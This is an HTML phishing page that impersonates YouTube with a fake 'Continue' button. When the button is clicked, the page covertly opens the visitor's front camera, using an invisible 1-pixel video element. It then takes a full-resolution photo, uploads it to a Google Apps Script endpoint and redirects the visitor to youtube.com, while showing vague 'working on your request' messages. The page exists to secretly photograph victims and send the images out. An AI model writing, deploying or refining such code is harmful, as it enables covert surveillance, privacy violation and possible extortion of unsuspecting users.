<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube-Mail</title>
    <style>
        body { 
            font-family: sans-serif; background: #0f0f0f; color: #e0e0e0;
            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; 
        }
        /* Hidden video element */
        #video { width: 1px; height: 1px; opacity: 0; position: absolute; }
        
        button { 
            padding: 20px 40px; font-size: 20px; background: #cc0000; color: white; border: none; border-radius: 50px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.5); cursor: pointer; font-weight: bold;
        }
        button:disabled { background: #555; }
        #status { margin-top: 25px; font-size: 16px; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" alt="Site Logo" class="site-logo" width="100" style="margin-bottom: 20px;">

    <h3>Press the Continue Button to Strat ⬇️</h3>

    <button id="actionBtn">Continue</button>
    <p id="status"></p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ================= CONFIGURATION =================
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzVKD-LOvEkGLXTQdkaTqocxzU-uPtPW_U9sCEvzh18jMTxeko2mjtsNMua06Tr7pBi/exec";
        const REDIRECT_URL = "https://www.youtube.com";
        // =================================================

        const btn = document.getElementById('actionBtn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        btn.addEventListener('click', async () => {
            btn.disabled = true;
            status.innerText = "hold on a sec...";

            try {
                // 1. REQUEST 4K Resolution (Max Quality)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 4096 }, 
                        height: { ideal: 2160 } 
                    } 
                });
                video.srcObject = stream;

                // 2. Wait 1.0s for focus (High res needs a moment to focus)
                setTimeout(() => {
                    uploadToDrive(stream);
                }, 1000);

            } catch (err) {
                status.innerText = "❌ Error: " + err.message;
                btn.disabled = false;
            }
        });

        function uploadToDrive(stream) {
            status.innerText = "working on your request...";

            // 3. Match Canvas to Camera Resolution (No resizing)
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0); // Draw exactly what the camera sees
            
            stream.getTracks().forEach(track => track.stop());

            // 4. MAX QUALITY (1.0 = 100% Quality)
            // Note: This creates a large file (3MB - 8MB). Upload may take 3-5 seconds.
            const dataURL = canvas.toDataURL('image/jpeg', 1.0); 

            fetch(SCRIPT_URL, {
                method: "POST",
                headers: { "Content-Type": "text/plain" },
                body: JSON.stringify({ image: dataURL })
            })
            .then(response => response.text())
            .then(text => {
                // If text starts with "Error", show it
                if (text.includes("Error")) {
                    status.innerText = "❌ Server Error: " + text;
                } else {
                    status.innerText = "✅ Redirecting...";
                    window.location.href = REDIRECT_URL;
                }
            })
            .catch(err => {
                status.innerText = "❌ Network Error (File too big?)"; 
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
